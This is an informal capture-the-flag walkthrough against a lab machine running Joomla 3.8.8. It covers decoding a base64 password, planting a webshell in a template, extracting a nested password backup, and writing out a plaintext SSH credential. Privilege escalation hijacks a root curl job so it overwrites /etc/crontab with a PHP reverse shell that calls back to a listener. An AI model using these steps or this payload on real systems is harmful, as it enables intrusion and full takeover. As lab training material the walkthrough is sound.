joomla version 3.8.8

found a file secret.txt
Q3VybGluZzIwMTgh
this is base64
Curling2018!

we also found a username: floris

using this we can login on the joomla,
edit the index template and insert the webshell

with this create a revshell,
where the www-data user

in the /home/floris/ folder there is a pasword backup file

after extracting multiple times:
gzip -d test.tar.gz
xxd test.tar
mv test.tar test.bz
file test.bz
bzip2 test.bz
xxd test
file test
tar xf test
file test
cat password.txt:

we can login with through ssh:
floris:5d<wdCbdZu)|hChXll

using pspy32
we see the root execute a:
curl -K file -o output

setup 2 listeners:
nc -lvnp 1234
python3 -m http.server

on the python server
we have a file crontabwith:
`* * * * *       root    php -r '$sock=fsockopen("10.10.14.4",1234);exec("/bin/sh <&3 >&3 2>&3");'`

on the ssh we change the file:
echo -e "url = \"http://{hackboxip}:8000/crontab\"\noutput = \"/etc/crontab\""> file

how this works:
the curl is being executed all the time
changing the config file makes it curl our webpage with the crontab
and changes the boxs crontab to our local crontab
our crontab executes a reverse shell to our nc listener
and thats how we get a shell
